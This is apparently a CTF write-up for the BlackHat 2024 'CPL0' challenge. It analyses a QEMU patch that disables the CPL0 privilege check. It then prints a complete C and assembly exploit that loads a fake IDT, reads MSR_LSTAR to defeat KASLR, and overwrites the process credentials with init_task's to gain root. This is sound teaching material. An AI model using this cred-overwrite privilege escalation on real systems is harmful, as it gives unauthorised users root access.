---
layout: post
title: BlackHat 2024 2024 Quals - CPL0
date: 2023-11-26 00:00
category: writeup
author: stdnoerr
tags: [kernel, qemu]
summary: Write for CPL0 in BlackHat 2024 Qualifiers.
---
I played BlackHat 2024 Qualifiers with [AirOverflow](https://team.airoverflow.com/). I didn't get much time to play and only managed to solve CPL0.
The challenge provided a qemu patch and docker container files. I assumed that it was a kernel challenge but it turned out to be very different. Here's how I solved it: -

# Analysis
## Patch file
Here's the Qemu patch file: -
```patch
diff --git a/target/i386/tcg/translate.c b/target/i386/tcg/translate.c
index 95bad55bf4..309e540957 100644
--- a/target/i386/tcg/translate.c
+++ b/target/i386/tcg/translate.c
@@ -233,7 +233,7 @@ typedef struct DisasContext {
  */
 #define STUB_HELPER(NAME, ...) \
     static inline void gen_helper_##NAME(__VA_ARGS__) \
-    { qemu_build_not_reached(); }
+    { /* qemu_build_not_reached(); */ }
 
 #ifdef CONFIG_USER_ONLY
 STUB_HELPER(clgi, TCGv_env env)
@@ -1386,11 +1386,7 @@ static void gen_exception_gpf(DisasContext *s)
 /* Check for cpl == 0; if not, raise #GP and return false. */
 static bool check_cpl0(DisasContext *s)
 {
-    if (CPL(s) == 0) {
-        return true;
-    }
-    gen_exception_gpf(s);
-    return false;
+    return true;
 }
 
 /* XXX: add faster immediate case */
```

The patch file modifies a function and a macro. The macro is simply a wrapper for labeling unreachable regions in the code. Our interest lies in the function `check_cpl0`. Whatever the function was checking has been patched to always return true.

## What is CPL?
For those of you who don't know, Qemu is a CPU emulator. It helps translates instruction of one guest CPU type on another host CPU. Guest and host CPUs can be same. This helps develops test programs that handle low level stuff without having to debug everything on their physical CPU, which is an extremely frustrating task.

If you track the `CPL` macro in qemu code, it shows up to be the following: -
```c
#define CPL(S)    ((S)->cpl)
```
Here `S` or `s` in the function is a pointer of type `struct DisasContext`. The `cpl` member of this struct has the following comment: -
```c
typedef struct DisasContext {
    DisasContextBase base;

    target_ulong pc;       /* pc = eip + cs_base */
    target_ulong cs_base;  /* base of CS segment */
    target_ulong pc_save;

    MemOp aflag;
    MemOp dflag;

    int8_t override; /* -1 if no override, else R_CS, R_DS, etc */
    uint8_t prefix;

    bool has_modrm;
    uint8_t modrm;

#ifndef CONFIG_USER_ONLY
    uint8_t cpl;   /* code priv level */
    uint8_t iopl;  /* i/o priv level */
#endif
[truncated]
```
So now we know that `CPL` is actually `code privilege level`. But what does it mean?<br/>
If you look it up in the Intel docs, you will find that code on x86 CPUs have a ring model of privileges. These privileges are also called code privileges. It has privilege levels for `0` to `3` (some details are avoided for brevity). `0` Privilege level is where the Kernel executes and `3` privilege level is what all user programs are assigned. This helps CPUs deny access to sensitive things to user programs and maintains privilege separation.

The patch modified the CPL check such that whenever a privileged instruction is encountered in userspace code, it treats it as though it came from kernel code. Hence any user program can do kernel actions and execute privileged instructions.

## What Privileged instructions are there?
If you look up in the Intel's Software Developer Manual for privileged instructions, you will find the following section:
```
6.9 PRIVILEGED INSTRUCTIONS
Some of the system instructions (called “privileged instructions”) are protected from use by application programs.
The privileged instructions control system functions (such as the loading of system registers). They can be
executed only when the CPL is 0 (most privileged). If one of these instructions is executed when the CPL is not 0,
a general-protection exception (#GP) is generated. The following system instructions are privileged instructions:
• LGDT — Load GDT register.
• LLDT — Load LDT register.
• LTR — Load task register.
• LIDT — Load IDT register.
• MOV (control registers) — Load and store control registers.
• LMSW — Load machine status word.
• CLTS — Clear task-switched flag in register CR0.
• MOV (debug registers) — Load and store debug registers.
• INVD — Invalidate cache, without writeback.
• WBINVD — Invalidate cache, with writeback.
• INVLPG — Invalidate TLB entry.
• HLT— Halt processor.
• RDMSR — Read Model-Specific Registers.
• WRMSR — Write Model-Specific Registers.
• RDPMC — Read Performance-Monitoring Counter.
• RDTSC — Read Time-Stamp Counter.
Some of the privileged instructions are available only in the more recent families of Intel 64 and IA-32 processors
(see Section 24.13, “New Instructions In the Pentium and Later IA-32 Processors”).
The PCE and TSD flags in register CR4 (bits 4 and 2, respectively) enable the RDPMC and RDTSC instructions,
respectively, to be executed at any CPL.
```

This gives us a list of privileged instructions and their short descriptions.

# Exploitation
## What is the Objective?
Since our code was executing as an unprivileged user, it was obvious that we had to escalate privileges. But we had to do it using some privileged instruction instead of exploiting the kernel.

## Interrupt Descriptor Table
I decided to overwrite the interrupt descriptor table using the `LIDT` instruction. The Interrupt Descriptor table holds entries for handling interrupts.
Interrupts are the equivalent of "events" in an Operating System. A common interrupt is `int 0x80` that is used to serve syscalls in Linux.

By overwriting IDT, we will control what code is executed when an interrupt is generated. As to why we want that is because whenever an interrupt is generated, the code privilege level is actually made `0`. We need this because we need to access MSRs (Model Specific Registers) and I wasn't able to access them using a user program.

By searching for ways to escalate privileges when we have control of IDT revealed [this](https://rdomanski.github.io/Kernel-IDT-priviledge-escalation/) and [this](https://hxp.io/blog/99/hxp-CTF-2022-one_byte-writeup/) writeup.

The first writeup explains the IDT entry structure in detail and the second one provides details on how to escalate privileges when you can execute code in CPL0.

## Exploit
I first made C structs for IDT and IDT entry, then I first read the IDT using `SIDT` to later recover the IDT to a stable state, made a fake IDT that will redirect all interrupts to my handle, and performed an interrupt to execute the handler. The handler does privilege escalation based on hxp writeup.<br/>
The privilege escalation is done by overwriting the `struct cred` of the current process with `init_task`. The struct is located by access `current` (in linux kernel language) that is acquired by reading the `gs` segment register. To access the kernel `gs`, `swapgs` is executed and `init_task` is located by getting a kernel leak via reading `MSR_LSTAR` which holds the handler for `syscall` and `sysenter` instructions. `cli` and `sti` are used to disable and enable interrupts respectively and `LIDT` is used to fix IDT so the program doesn't crash after returning. To return `iretq` is used because we are in an interrupt context.

### Final exploit
```c
#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>

#define INTERRUPT_SS 0x0010
#define INTERRUPT_FLAGS 0xee00
#define TOTAL_INTERRUPTS 0x100

struct IDT {
	uint16_t limit;
	uint64_t addr;
} __attribute__((packed));

typedef struct {
    uint16_t loword;
    uint16_t ss;
    uint16_t flags;
    uint16_t hiword;
    uint32_t hidword;
    uint32_t reserved;
} __attribute__((packed)) IDTEntry;

void interrupt_handler(void);
struct IDT fake_idt = {}, original_idt = {};

int create_fake_idt(struct IDT* out_idt, void * handler){
    IDTEntry *idt = mmap(NULL, sizeof(IDTEntry) * TOTAL_INTERRUPTS, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANON, -1, 0);

    if (idt == MAP_FAILED)
        return -1;
    
    IDTEntry entry = {
        .flags = INTERRUPT_FLAGS, 
        .ss = INTERRUPT_SS, 
        .hidword = (uint64_t) handler >> 32, 
        .hiword = ((uint64_t) handler & 0xffff0000) >> 16, 
        .loword = (uint64_t) handler & 0xffff};
    
    for (int i = 0; i < TOTAL_INTERRUPTS; i++){
        idt[i] = entry;
    }

    out_idt->addr = idt;
    out_idt->limit = sizeof(IDTEntry) * TOTAL_INTERRUPTS - 1;

    return 0;
}

int main(){
    asm volatile("sidt %0" : "=m" (original_idt));

    if (create_fake_idt(&fake_idt, interrupt_handler) < 0){
        fprintf(stderr, "Error creating fake IDT\n");
    }

    asm volatile ("lidt %0" : "=m" (fake_idt));
    asm volatile ("int 0");

    system("id; cat /root/flag.txt");

    return 0;
}
```
```asm
#include <linux/mman.h>
#include <sys/syscall.h>

#define MSR_LSTAR 0xc0000082
#define KASLR_LSTAR 0x800080
#define KASLR_INIT_TASK 0xe0a580
#define PERCPU_CURRENT 0x21440
#define STRUCT_TASK_STRUCT_REAL_CRED 0x5b0
#define STRUCT_TASK_STRUCT_CRED 0x5b8
#define STRUCT_CRED_USAGE 0x0

.global interrupt_handler

interrupt_handler:
    // Disable interrupts (interrupts cause double faults right now)
    cli

    // Read LSTAR to bypass KASLR
    movl $MSR_LSTAR,  %ecx
    rdmsr
    shlq $32, %rdx
    orq %rax, %rdx
    subq $KASLR_LSTAR, %rdx

    // Get access to per-cpu variables (current, mostly) via swapgs
    swapgs

    // Set current->cred and current->real_cred to init_task->cred
    addq $KASLR_INIT_TASK, %rdx
    movq STRUCT_TASK_STRUCT_CRED(%rdx), %rdx
    addl $2, STRUCT_CRED_USAGE(%rdx)
    movq %gs:PERCPU_CURRENT, %rax
    movq %rdx, STRUCT_TASK_STRUCT_CRED(%rax)
    movq %rdx, STRUCT_TASK_STRUCT_REAL_CRED(%rax)

    // Swap back
    swapgs

    // Fix IDT
    lidt original_idt

    // Enable interrupts
    sti
    iretq
```